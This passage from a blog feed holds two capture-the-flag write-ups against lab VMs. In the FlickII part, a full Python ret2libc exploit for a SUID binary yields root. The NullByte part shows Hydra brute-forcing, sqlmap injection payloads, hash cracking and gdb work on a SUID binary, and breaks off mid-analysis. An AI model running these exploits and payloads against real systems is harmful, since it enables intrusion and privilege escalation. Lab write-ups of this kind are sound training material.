&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;bash-4.2$ newgrp sean;
bash: /home/bryan/.bashrc: Permission denied
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I think I totally cheated at this point - I went back to bryan and chmodded his home dir and .bashrc file to 777.  Then I was able to set my group.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[sean@fII storage]$ id
uid=1002(sean) gid=1002(sean) groups=1002(sean),1001(bryan)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Notice how my &lt;code&gt;gid&lt;/code&gt; is now &lt;code&gt;sean&lt;/code&gt; rather than &lt;code&gt;bryan&lt;/code&gt;.  Now I can execute &lt;code&gt;restore&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[sean@fII ~]$ /usr/local/bin/restore
Restore tool v0.1
Enter the path to the backup.tar.gz: /
/ does not contain a backup.tar.gz file or access was denied

[sean@fII ~]$ cd /tmp
[sean@fII tmp]$ touch backup.tar.gz

[sean@fII tmp]$ /usr/local/bin/restore
Restore tool v0.1
Enter the path to the backup.tar.gz: /tmp/
Path is: /tmp/
Enter the output directory: /tmp/
Output directory is: /tmp/
This is a beta, run the following command for now: 
/bin/sh -c &amp;quot;/usr/bin/tar xf /tmp/backup.tar.gz -C /tmp/ database.sqlite&amp;quot;
You are currently running this tool as: 
uid=0(root) gid=0(root) groups=0(root),1001(bryan),1002(sean)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The command it gives us doesn&amp;rsquo;t look all that useful, but the binary is kind enough to remind us that we are executing with root privs.  As before, I transfered this to my kali box.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# file restore
restore: setuid ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=f8c768078fb1214a9777e6a6a50fef30061716d7, not stripped

gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I able to find what appeard to be a buffer overflow in the second input field.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# python -c &#39;print &amp;quot;/root/\n&amp;quot; + &amp;quot;A&amp;quot; * 500&#39; | ./restore
Restore tool v0.1
Enter the path to the backup.tar.gz: Path is: /root/
Enter the output directory: Output directory is
Segmentation fault
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# python -c &#39;print &amp;quot;/root/\n&amp;quot; + &amp;quot;A&amp;quot; * 500&#39; &amp;gt; exploit 
root@kali:~# gdb -q restore
gdb-peda$ r &amp;lt; exploit 

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7ffd813d71d0 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
RBX: 0x400310 (&amp;lt;_init&amp;gt;:	sub    rsp,0x8)
RCX: 0x7ffffdf6 
RDX: 0x6bf600 --&amp;gt; 0x0 
RSI: 0x7fe366ca2000 (&amp;quot;Enter the output directory: Output directory is: &amp;quot;, &#39;A&#39; &amp;lt;repeats 151 times&amp;gt;...)
RDI: 0x0 
RBP: 0x4141414141414141 (&#39;AAAAAAAA&#39;)
RSP: 0x7ffd813d7218 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
RIP: 0x40101f (&amp;lt;get_out_path+62&amp;gt;:	ret)
R8 : 0x4141414141414141 (&#39;AAAAAAAA&#39;)
R9 : 0x4141414141414141 (&#39;AAAAAAAA&#39;)
R10: 0x1f4 
R11: 0x246 
R12: 0x0 
R13: 0x401710 (&amp;lt;__libc_csu_init&amp;gt;:	push   r14)
R14: 0x4017a0 (&amp;lt;__libc_csu_fini&amp;gt;:	push   rbx)
R15: 0x0
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401015 &amp;lt;get_out_path+52&amp;gt;:	call   0x402130 &amp;lt;printf&amp;gt;
   0x40101a &amp;lt;get_out_path+57&amp;gt;:	lea    rax,[rbp-0x40]
   0x40101e &amp;lt;get_out_path+61&amp;gt;:	leave  
=&amp;gt; 0x40101f &amp;lt;get_out_path+62&amp;gt;:	ret    
   0x401020 &amp;lt;do_restore&amp;gt;:	push   rbp
   0x401021 &amp;lt;do_restore+1&amp;gt;:	mov    rbp,rsp
   0x401024 &amp;lt;do_restore+4&amp;gt;:	sub    rsp,0x20
   0x401028 &amp;lt;do_restore+8&amp;gt;:	mov    QWORD PTR [rbp-0x18],rdi
[------------------------------------stack-------------------------------------]
0000| 0x7ffd813d7218 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0008| 0x7ffd813d7220 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0016| 0x7ffd813d7228 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0024| 0x7ffd813d7230 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0032| 0x7ffd813d7238 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0040| 0x7ffd813d7240 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0048| 0x7ffd813d7248 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0056| 0x7ffd813d7250 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x000000000040101f in get_out_path ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I found the offset to &lt;code&gt;RIP&lt;/code&gt;, using &lt;code&gt;pattern_create&lt;/code&gt; &amp;amp; &lt;code&gt;pattern_offset&lt;/code&gt; in the Metasploit Framework.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7ffcf5bc8780 (&amp;quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag&amp;quot;...)
RBX: 0x400310 (&amp;lt;_init&amp;gt;:	sub    rsp,0x8)
RCX: 0x7ffffdf6 
RDX: 0x6bf600 --&amp;gt; 0x0 
RSI: 0x7fc6d9cde000 (&amp;quot;Output directory is: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af&amp;quot;...)
RDI: 0x0 
RBP: 0x3363413263413163 (&#39;c1Ac2Ac3&#39;)
RSP: 0x7ffcf5bc87c8 (&amp;quot;Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj&amp;quot;...)
RIP: 0x40101f (&amp;lt;get_out_path+62&amp;gt;:	ret)
R8 : 0x7141357141347141 (&#39;Aq4Aq5Aq&#39;)
R9 : 0x4136704135704134 (&#39;4Ap5Ap6A&#39;)
R10: 0x1f4 
R11: 0x246 
R12: 0x0 
R13: 0x401710 (&amp;lt;__libc_csu_init&amp;gt;:	push   r14)
R14: 0x4017a0 (&amp;lt;__libc_csu_fini&amp;gt;:	push   rbx)
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)

gdb-peda$ x/wx $rsp
0x7ffcf5bc87c8:	0x41346341

root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x41346341
[*] Exact match at offset 72
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Test that offset.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# python -c &#39;print &amp;quot;/root/\n&amp;quot; + &amp;quot;A&amp;quot; * 72 + &amp;quot;BBBBBB&amp;quot;&#39; &amp;gt; exploit 

gdb-peda$ r &amp;lt; exploit 

Stopped reason: SIGSEGV
0x0000424242424242 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With &lt;code&gt;NX&lt;/code&gt; enabled, I like to go for a nice &lt;code&gt;ret2libc&lt;/code&gt;.  So to do that, I first need the address of system.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ p system
$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x401fd0 &amp;lt;system&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In 64-bit, parameters are passed in registers. So I need to occupy the &lt;code&gt;RDI&lt;/code&gt; register with &lt;code&gt;/bin/sh&lt;/code&gt; - to do this, I&amp;rsquo;ll use a ROP gadget to pop (rdi) the string &amp;lsquo;/bin/sh&amp;rsquo; from the stack.  The string itself is easy enough to find.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ find &#39;/bin/sh&#39;
Searching for &#39;/bin/sh&#39; in: None ranges
Found 2 results, display max 2 items:
restore : 0x492bad --&amp;gt; 0x68732f6e69622f (&#39;/bin/sh&#39;)
restore : 0x492d20 --&amp;gt; 0x68732f6e69622f (&#39;/bin/sh&#39;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To find the gadget, I used &lt;code&gt;ropper&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ropper --file restore --search &amp;quot;pop rdi&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There&amp;rsquo;s a perfect instruction here: &lt;code&gt;0x000000000040167e: pop rdi; ret;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now to build the exploit&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python

from struct import *

buf = &amp;quot;&amp;quot;
buf = &amp;quot;/root/\n&amp;quot;
buf += &amp;quot;A&amp;quot; * 72                         # junk
buf += pack(&amp;quot;&amp;lt;Q&amp;quot;, 0x000000000040167e)   # pop rdi; ret
buf += pack(&amp;quot;&amp;lt;Q&amp;quot;, 0x492bad)             # /bin/sh
buf += pack(&amp;quot;&amp;lt;Q&amp;quot;, 0x0000000000401fd0)   # system

f = open(&amp;quot;exploit&amp;quot;, &amp;quot;w&amp;quot;)
f.write(buf)
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ./exploit.py 

root@kali:~# (cat exploit; cat) | ./restore 
Restore tool v0.1
Enter the path to the backup.tar.gz: Path is: /root/

Enter the output directory: Output directory is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA~@

id
uid=0(root) gid=0(root) groups=0(root)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Seems to work locally&amp;hellip; Transfer it across to Flick II (and change /root/ to /tmp/).&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[sean@fII tmp]$ ls -l

-rw-rw-r-- 1 sean  sean     0 Sep  8 22:37 backup.tar.gz
-rw-rw-r-- 1 sean  sean   102 Sep  8 23:00 exploit
-rwxrwxr-x 1 sean  sean   274 Sep  8 23:00 exploit.py
-rwxrwxr-x 1 robin robin 8034 Sep  8 22:00 rand.so

[sean@fII tmp]$ (cat exploit; cat) | /usr/local/bin/restore

id; whoami
uid=0(root) gid=0(root) groups=0(root),1001(bryan),1002(sean)
root
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;flag:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;Flag&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;cat /root/flag

  █████▒██▓     ██▓ ▄████▄   ██ ▄█▀ ██▓ ██▓
▓██   ▒▓██▒    ▓██▒▒██▀ ▀█   ██▄█▒ ▓██▒▓██▒
▒████ ░▒██░    ▒██▒▒▓█    ▄ ▓███▄░ ▒██▒▒██▒
░▓█▒  ░▒██░    ░██░▒▓▓▄ ▄██▒▓██ █▄ ░██░░██░
░▒█░   ░██████▒░██░▒ ▓███▀ ░▒██▒ █▄░██░░██░
 ▒ ░   ░ ▒░▓  ░░▓  ░ ░▒ ▒  ░▒ ▒▒ ▓▒░▓  ░▓  
 ░     ░ ░ ▒  ░ ▒ ░  ░  ▒   ░ ░▒ ▒░ ▒ ░ ▒ ░
 ░ ░     ░ ░    ▒ ░░        ░ ░░ ░  ▒ ░ ▒ ░
           ░  ░ ░  ░ ░      ░  ░    ░   ░  
                   ░                       

 You have successfully completed FlickII!

 I hope you learnt as much as I did while
 making it! Any comments/suggestions etc,
 feel free to catch me on freenode in
 #vulnhub or on twitter @leonjza
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Many thanks to leonjza for a brilliant VM - one of my favourites to date.  Shout-out to &lt;a href=&#34;https://twitter.com/superkojiman&#34;&gt;superkojiman&lt;/a&gt; for his excellent &lt;a href=&#34;http://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/&#34;&gt;64-bit Stack Smashing Tutorial&lt;/a&gt; which came in super-handy for this final exercise.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>NullByte 0x01</title>
      <link>https://rastamouse.me/writeups/2015/nullbyte-0x01/</link>
      <pubDate>Fri, 21 Aug 2015 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/writeups/2015/nullbyte-0x01/</guid>
      <description>

&lt;p&gt;NullByte is a hacking challenge created by &lt;a href=&#34;https://twitter.com/@ly0nx&#34;&gt;ly0n&lt;/a&gt;, pitched at a beginner-intermediate level.  The objective is to grab the flag.&lt;/p&gt;

&lt;h2 id=&#34;port-scan:485cf21adfc47fdddfc7e45f092151aa&#34;&gt;Port Scan&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -A 192.168.56.102

PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Null Byte 00 - level 1
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          53905/udp  status
|_  100024  1          54255/tcp  status
777/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
|_  256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pop on over in a browser and we see an Eye of Harmony and a little message.  There&amp;rsquo;s nothing else to see, so I did some directory bruteforcing.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/nullbyte0x01/eye.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# gobuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.56.102 -f

=====================================================
Gobuster v0.8 (DIR support by OJ Reeves @TheColonial)
              (DNS support by Peleus     @0x42424242)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.56.102/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
[+] Add Slash    : true
=====================================================
/uploads/ (200)
/phpmyadmin/ (200)
=====================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I haven&amp;rsquo;t any credentials for phpMyAdmin, so lets take a closer look at the image (main.gif).&lt;/p&gt;

&lt;p&gt;Using &lt;code&gt;exiftool&lt;/code&gt;, we can see that there is an embeded comment.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/Downloads# exiftool main.gif 
ExifTool Version Number         : 9.74
File Name                       : main.gif
Directory                       : .
File Size                       : 16 kB
File Modification Date/Time     : 2015:08:21 21:53:41+01:00
File Access Date/Time           : 2015:08:21 21:53:41+01:00
File Inode Change Date/Time     : 2015:08:21 21:53:41+01:00
File Permissions                : rw-r--r--
File Type                       : GIF
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-): kzMb5nVYJw
Image Size                      : 235x302
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;kzMb5nVYJw&lt;/code&gt; seems to be an interesting string.  After trying various things (passwords etc), it turns out this is a new web directory.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://192.168.56.102/kzMb5nVYJw/

&amp;lt;center&amp;gt;
&amp;lt;form method=&amp;quot;post&amp;quot; action=&amp;quot;index.php&amp;quot;&amp;gt;
Key:&amp;lt;br&amp;gt;
&amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;key&amp;quot;&amp;gt;
&amp;lt;/form&amp;gt; 
&amp;lt;/center&amp;gt;
&amp;lt;!-- this form isn&#39;t connected to mysql, password ain&#39;t that complex --!&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The notion that the password isn&amp;rsquo;t complex implies that we may be able to bruteforce it.  I did this with Hydra - note that it requires both a password and a username be specified.  You can give it a dummy username without supplying it in the actual request.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# hydra 192.168.56.102 http-form-post &amp;quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&amp;quot; -l rasta -P /usr/share/wordlists/metasploit-jtr/password.lst
[80][http-post-form] host: 192.168.56.102   login: rasta   password: elite
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After loggin in with the key &lt;code&gt;elite&lt;/code&gt;, we see a form where we can search for usernames.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/nullbyte0x01/usrsearch.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;Submitting a blank query returns two results.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://192.168.56.102/kzMb5nVYJw/420search.php?usrtosearch=

EMP ID :1
EMP NAME : ramses
EMP POSITION :
--------------------------------
EMP ID :2
EMP NAME : isis
EMP POSITION : employee
--------------------------------
Fetched data successfully
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;sqli:485cf21adfc47fdddfc7e45f092151aa&#34;&gt;SQLi&lt;/h2&gt;

&lt;p&gt;I threw &lt;code&gt;sqlmap&lt;/code&gt; at the page, to try injections in the &lt;code&gt;usrtosearch&lt;/code&gt; field. Luckily, it returned a few blind-based possible injections.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# sqlmap -u &amp;quot;http://192.168.56.102/kzMb5nVYJw/420search.php?usrtosearch=&amp;quot; --dbms=MySQL

---
Parameter: usrtosearch (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: usrtosearch=&amp;quot; AND 8735=8735#

    Type: AND/OR time-based blind
    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT - comment)
    Payload: usrtosearch=&amp;quot; AND (SELECT * FROM (SELECT(SLEEP(5)))pEsD)#

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: usrtosearch=&amp;quot; UNION ALL SELECT NULL,CONCAT(0x7178787071,0x736e4f426852624a4242,0x7178786a71),NULL#
---
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] seth
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I couldn&amp;rsquo;t find any credentials in the &lt;code&gt;phpmyadmin&lt;/code&gt; database, so went on to explore &lt;code&gt;seth&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Database: seth
Table: users
[2 entries]
+----+---------------------------------------------+--------+------------+
| id | pass                                        | user   | position   |
+----+---------------------------------------------+--------+------------+
| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | &amp;lt;blank&amp;gt;    |
| 2  | --not allowed--                             | isis   | employee   |
+----+---------------------------------------------+--------+------------+
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This password is in the format of base64(md5), but has the terminating &lt;code&gt;=&lt;/code&gt; missing.  We can reverse the base64, recover the md5 and crack with &lt;code&gt;john&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# echo -en &#39;YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE=&#39; | base64 -d
c6d6bd7ebf806f43c76acc3681703b81
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# echo -en &#39;YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE=&#39; | base64 -d &amp;gt; ramses

root@kali:~# john --format=raw-md5 ramses 

Loaded 1 password hash (Raw-MD5 [MD5 32/32])
omega            (?)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;ssh:485cf21adfc47fdddfc7e45f092151aa&#34;&gt;SSH&lt;/h2&gt;

&lt;p&gt;The credentials &lt;code&gt;ramses:omega&lt;/code&gt; can also be used to log in via SSH, remember on port 777.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh ramses@192.168.56.102 -p777
ramses@192.168.56.102&#39;s password:

ramses@NullByte:~$ pwd
/home/ramses
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;procwatch-suid:485cf21adfc47fdddfc7e45f092151aa&#34;&gt;procwatch SUID&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;.bash_history&lt;/code&gt; has references to &lt;code&gt;/var/www/backup/procwatch&lt;/code&gt;, which turns out to be a SUID binary owned by &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-rwsr-xr-x 1 root root 4932 Aug  2 01:29 procwatch
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running the binary seems to produce output from &lt;code&gt;ps&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ramses@NullByte:/var/www/backup$ ./procwatch 
  PID TTY          TIME CMD
24253 pts/0    00:00:00 procwatch
24254 pts/0    00:00:00 sh
24255 pts/0    00:00:00 ps
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The binary doesn&amp;rsquo;t seem to take any input as arguments, so I used &lt;code&gt;scp&lt;/code&gt; to copy it to my Kali box for closer inspection.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# scp -P777 ramses@192.168.56.102:/var/www/backup/procwatch .
ramses@192.168.56.102&#39;s password: 
procwatch                                                                                                                   100% 4932     4.8KB/s   00:00
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# file procwatch 
procwatch: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=17d666a0c940726b29feedde855535fb21cb160c, not stripped

root@kali:~# gdb -q ./procwatch
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Let&amp;rsquo;s disassemble the main function.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ pdisass main

   0x080483fb &amp;lt;+0&amp;gt;:	lea    ecx,[esp+0x4]
   0x080483ff &amp;lt;+4&amp;gt;:	and    esp,0xfffffff0
   0x08048402 &amp;lt;+7&amp;gt;:	push   DWORD PTR [ecx-0x4]
   0x08048405 &amp;lt;+10&amp;gt;:	push   ebp
   0x08048406 &amp;lt;+11&amp;gt;:	mov    ebp,esp
   0x08048408 &amp;lt;+13&amp;gt;:	push   ecx
   0x08048409 &amp;lt;+14&amp;gt;:	sub    esp,0x44
   0x0804840c &amp;lt;+17&amp;gt;:	lea    eax,[ebp-0x3a]
   0x0804840f &amp;lt;+20&amp;gt;:	mov    WORD PTR [eax],0x7370
   0x08048414 &amp;lt;+25&amp;gt;:	mov    BYTE PTR [eax+0x2],0x0
   0x08048418 &amp;lt;+29&amp;gt;:	sub    esp,0xc
   0x0804841b &amp;lt;+32&amp;gt;:	lea    eax,[ebp-0x3a]
   0x0804841e &amp;lt;+35&amp;gt;:	push   eax
   0x0804841f &amp;lt;+36&amp;gt;:	call   0x80482d0 &amp;lt;system@plt&amp;gt;
   0x08048424 &amp;lt;+41&amp;gt;:	add    esp,0x10
   0x08048427 &amp;lt;+44&amp;gt;:	mov    eax,0x0
   0x0804842c &amp;lt;+49&amp;gt;:	mov    ecx,DWORD PTR [ebp-0x4]
   0x0804842f &amp;lt;+52&amp;gt;:	leave  
   0x08048430 &amp;lt;+53&amp;gt;:	lea    esp,[ecx-0x4]
   0x08048433 &amp;lt;+56&amp;gt;:	ret
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The call to &lt;code&gt;system()&lt;/code&gt; at &lt;code&gt;+36&lt;/code&gt; jumps out.  To see what was getting passed to system, I set a breakpoint at &lt;code&gt;0x0804841f&lt;/code&gt; and ran the binary.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ b *0x0804841f
gdb-peda$ r

[----------------------------------registers-----------------------------------]
EAX: 0xbff92fee --&amp;gt; 0x7370 (&#39;ps&#39;)
EBX: 0xb76ee000 --&amp;gt; 0x1a5da8 
ECX: 0xbff93040 --&amp;gt; 0x1 
EDX: 0xbff93064 --&amp;gt; 0xb76ee000 --&amp;gt; 0x1a5da8 
ESI: 0x0 
EDI: 0x0 
EBP: 0xbff93028 --&amp;gt; 0x0 
ESP: 0xbff92fd0 --&amp;gt; 0xbff92fee --&amp;gt; 0x7370 (&#39;ps&#39;)
EIP: 0x804841f (&amp;lt;main+36&amp;gt;:	call   0x80482d0 &amp;lt;system@plt&amp;gt;)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048418 &amp;lt;main+29&amp;gt;:	sub    esp,0xc
   0x804841b &amp;lt;main+32&amp;gt;:	lea    eax,[ebp-0x3a]
   0x804841e &amp;lt;main+35&amp;gt;:	push   eax
=&amp;gt; 0x804841f &amp;lt;main+36&amp;gt;:	call   0x80482d0 &amp;lt;system@plt&amp;gt;
   0x8048424 &amp;lt;main+41&amp;gt;:	add    esp,0x10
   0x8048427 &amp;lt;main+44&amp;gt;:	mov    eax,0x0
   0x804842c &amp;lt;main+49&amp;gt;:	mov    ecx,DWORD PTR [ebp-0x4]
   0x804842f &amp;lt;main+52&amp;gt;:	leave
Guessed arguments:
arg[0]: 0xbff92fee --&amp;gt; 0x7370 (&#39;ps&#39;)
arg[1]: 0x0 
arg[2]: 0xc2 
arg[3]: 0xb75dc586 (&amp;lt;handle_intel+102&amp;gt;:	test   eax,eax)
[------------------------------------stack-------------------------------------]
0000| 0xbff92fd0 --&amp;gt; 0xbff92fee --&amp;gt; 0x7370 (&#39;ps&#39;)
0004| 0xbff92fd4 --&amp;gt; 0x0 
0008| 0xbff92fd8 --&amp;gt; 0xc2 
0012| 0xbff92fdc --&amp;gt; 0xb75dc586 (&amp;lt;handle_intel+102&amp;gt;:	test   eax,eax)
